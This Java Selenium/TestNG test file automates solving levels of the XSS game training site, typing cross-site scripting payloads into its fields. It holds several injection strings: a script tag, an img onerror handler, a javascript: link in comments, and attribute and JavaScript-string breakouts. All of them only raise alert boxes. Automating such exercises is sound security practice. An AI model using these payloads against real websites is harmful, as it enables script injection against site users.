package testcases;

import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.By.ByClassName;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.testng.Assert;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;

import sectester.XSSUtils;
public class TestingXSS {

	//interface
		WebDriver driver;

	  @Test
	  public void canGetWebapp()
	  {
		  driver.get("https://xss-game.appspot.com/level1");
		  
		  Assert.assertTrue(driver.getTitle().contains("XSS game"));
		 // driver.close();

	  }
	  
	  @Test
	  public void first_test() throws InterruptedException
	  {
		 // amrdriver.get("https://xss-game.appspot.com/level1");
		  WebDriverWait wait = new WebDriverWait(driver, 10);
		  //driver.get("https://xss-game.appspot.com/level1/frame");
		  JavascriptExecutor java =(JavascriptExecutor)driver;
		  java.executeScript("window.scrollBy(0,350)", "");
		  //java.executeScript("document.getElementById('query').focus();");
			//driver.findElement(By.name("query")).sendKeys("<script>alert('XSS');</script>");
		  //driver.findElement(By.xpath("//*[@id=\"game-frame-container\"]"));
		 // driver.findElement(By.id("game-frame-container"));
		 // WebElement gm_frm =(WebElement) amrdriver.findElement(By.xpath("//*[@id=\"query\"]"));
		//  driver.findElement(By.name("query")).sendKeys("<script>alert('XSS');</script>");
		//Locating element by link text and store in variable "Element"        		
	      //WebElement Element = driver.findElement(By.linkText("Try Selenium Testing For Free"));
		  driver.switchTo().frame(0);
		WebElement Element = driver.findElement(By.id("query"));
		//Element.getAttribute("onfocus");
	      // Scrolling down the page till the element is found		
	      java.executeScript("arguments[0].scrollIntoView();", Element);
	      //Reflected XSS attack
	      //inject reflected XSS attack
	      driver.findElement(By.name("query")).sendKeys("<script>alert('Reflected XSS');</script>");
	      Thread.sleep(2000);
		 // Element.sendKeys("<script>alert('XSS');</script>");
		//  Element.sendKeys("<b onmouseover=alert('Wufff!')>click me!</b>");
		 XSSUtils.assertNotVulnerable();
	      WebElement search_btn =driver.findElement(By.xpath("//*[@id=\"button\"]"));
	      	search_btn.click();
	      	Alert alert = wait.until(ExpectedConditions.alertIsPresent());
	      	Thread.sleep(2000);
	      	alert.accept();
	      	driver.switchTo().defaultContent();
	      	//WebElement Element1= amrdriver.findElement(By.xpath("//h1[@id='level-title']"));
	      	//java.executeScript("arguments[0].scrollIntoView();", Element1);
	      	java.executeScript("window.scrollBy(0,-100)", "");
	      	Thread.sleep(2000);
	      	 WebElement Element2 = driver.findElement(By.linkText("Advance to next level >>"));
	      	 Element2.click();
	      	

	  }
	  @Test
	  public void storedXSS() throws InterruptedException
	  {
	      	 // stored XSS
	      	 //<img src='x' onerror='alert(1)'>
		  WebDriverWait wait = new WebDriverWait(driver, 10); 	
		  JavascriptExecutor java =(JavascriptExecutor)driver;
	      	driver.switchTo().frame(0);
			
			java.executeScript("window.scrollBy(0,350)", "");
			WebElement level2Element = driver.findElement(By.name("content"));
			level2Element.sendKeys("<img src='x' onerror='alert(/Stored XSS/)'>");
			//level2Element.sendKeys("<img src=x onerror=alert(document.location)>");
			//level2Element.sendKeys("<a href=javaSCRIPT&colon;alert(/XSS/)>XSS</a>");
			WebElement level2btn =driver.findElement(By.className("share"));
			level2btn.click();
	      	Alert alert2 = wait.until(ExpectedConditions.alertIsPresent());
	      	Thread.sleep(1000);
	      	alert2.accept();
	    	driver.switchTo().defaultContent();
	      	//WebElement Element1= amrdriver.findElement(By.xpath("//h1[@id='level-title']"));
	      	//java.executeScript("arguments[0].scrollIntoView();", Element1);
	      	java.executeScript("window.scrollBy(0,-100)", "");
	      	Thread.sleep(2000);
	      	 WebElement Element2 = driver.findElement(By.linkText("Advance to next level >>"));
	      	 Element2.click();
	      	 
	      	 
	      	 //reflected XSS
	    	 Thread.sleep(2000);
	   	  java.executeScript("window.scrollBy(0,-150)", "");
	   	  
	   		  
	   		  WebElement urlElement = driver.findElement(By.id("input1"));
	   		  java.executeScript("arguments[0].scrollIntoView();", urlElement);
	   	
	   		  urlElement.sendKeys("1' onerror='alert();//");
	   		 driver.findElement(By.className("urlbutton")).click();
	   		 
		      	Alert alert3 = wait.until(ExpectedConditions.alertIsPresent());
		      	Thread.sleep(1000);
		      	alert3.accept();
		      	java.executeScript("window.scrollBy(0,-100)", "");
		    	Thread.sleep(1000);
		      	 WebElement nextLevel = driver.findElement(By.linkText("Advance to next level >>"));
		      	nextLevel.click();
		      	Thread.sleep(500);
		      	
		      	XSSUtils.assertNotVulnerable();
		      	//WebSecUtils.assertElementNotVulnerable(Vulnerability.XSS, Level.SIMPLE);
		    	driver.switchTo().frame(0);
				java.executeScript("window.scrollBy(0,350)", "");
				WebElement level4Element = driver.findElement(By.id("timer"));
				level4Element.sendKeys("'**alert());//");
				WebElement level4btn =driver.findElement(By.id("button"));
				level4btn.click();
			  	Alert alert4 = wait.until(ExpectedConditions.alertIsPresent());
		      	Thread.sleep(1000);
		      	alert4.accept();
		      	
			  	Alert alert4_timesup = wait.until(ExpectedConditions.alertIsPresent());
		      	Thread.sleep(500);
		      	alert4_timesup.accept();
		      	Thread.sleep(500);
		    	driver.switchTo().defaultContent();
		      	java.executeScript("window.scrollBy(0,-100)", "");
		      	 WebElement nextLevel4 = driver.findElement(By.linkText("Advance to next level >>"));
		      	nextLevel4.click();
		      	Thread.sleep(500);
		      	
	  
	  }
	  
	  		 
	  @Test
	  public void refXSS() throws InterruptedException
	  {
		 // WebDriverWait wait = new WebDriverWait(driver, 10); 	
		//  JavascriptExecutor java =(JavascriptExecutor)driver;
		//	Thread.sleep(500);
	//

		  WebDriverWait wait = new WebDriverWait(driver, 10); 	
		  JavascriptExecutor java =(JavascriptExecutor)driver;
	      

			
	  }
	  
	  @BeforeClass
	public void open_browser()
	{
		  //System.setProperty("webdriver.chrome.whitelistedIps", "");
		System.setProperty("webdriver.chrome.driver", ".\\drivers\\chromedriver.exe");
		driver = new ChromeDriver();
		

	}
	  @AfterClass
	  public void close_browser()
	 {
		 //amrdriver.close();
		  
	  }
	}

